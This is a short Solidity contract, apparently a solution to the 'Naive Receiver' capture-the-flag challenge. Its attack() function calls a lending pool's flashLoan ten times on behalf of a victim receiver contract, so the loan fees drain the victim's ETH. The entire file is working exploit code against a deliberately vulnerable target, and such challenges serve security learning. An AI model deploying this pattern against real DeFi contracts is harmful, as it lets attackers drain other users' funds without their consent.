// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {NaiveReceiverLenderPool} from "./NaiveReceiverLenderPool.sol";
import {FlashLoanReceiver} from "./FlashLoanReceiver.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract NaiveReceiveAttacker {
    NaiveReceiverLenderPool pool;
    FlashLoanReceiver receiver;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
 
    constructor(address pool_, address receiver_){
        pool = NaiveReceiverLenderPool(payable(pool_));
        receiver = FlashLoanReceiver(payable(receiver_));
    }

    function attack() public {
        uint256 count;
        while(count<10){
             pool.flashLoan(IERC3156FlashBorrower(address(receiver)), ETH, 10**18, hex'00');
             count++;

        }
       

    }   
}